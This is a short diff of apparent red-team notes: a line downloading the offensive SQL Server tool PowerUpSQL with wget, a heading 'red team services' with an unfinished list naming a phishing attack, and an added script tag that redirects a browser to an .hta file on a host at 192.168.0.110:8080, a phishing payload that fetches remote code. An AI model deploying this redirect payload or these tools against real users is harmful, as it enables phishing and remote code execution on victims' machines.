@@ -1,1 +1,8 @@
 power install = wget https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1 -o PowerUpSQL.ps1
+
+
+red team services
+1) phising attack
+2 
+
+<script>window.location='http://192.168.0.110:8080/xRgUVQ.hta'</script>
